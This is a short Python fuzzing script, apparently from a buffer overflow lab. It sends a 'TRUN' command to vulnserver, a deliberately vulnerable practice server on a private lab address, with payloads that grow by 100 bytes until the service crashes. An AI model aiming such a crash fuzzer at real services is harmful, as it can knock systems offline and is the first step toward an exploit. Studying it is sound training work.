#!/usr/bin/env python3

import socket
import time

HOST = "172.16.19.132"
PORT = 9999

buffer_size = 100

while True:
    buffer = b"A" * buffer_size

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)

        print(f"[*] Connecting with {buffer_size} bytes...")

        s.connect((HOST, PORT))
        s.sendall(b"TRUN /.:/" + buffer)

        print(f"[+] Sent {buffer_size} bytes")

        # Give vulnserver time to process the request
        time.sleep(2)

        s.close()

        buffer_size += 100

    except ConnectionRefusedError:
        print(f"\n[!] Target is no longer accepting connections.")
        print(f"[!] Crash likely occurred around {buffer_size} bytes.")
        break

    except (ConnectionResetError, BrokenPipeError, socket.timeout) as e:
        print(f"\n[!] Connection lost at {buffer_size} bytes: {e}")
        print("[!] Check vulnserver/debugger.")
        break

    except Exception as e:
        print(f"\n[!] Error at {buffer_size} bytes: {e}")
        break
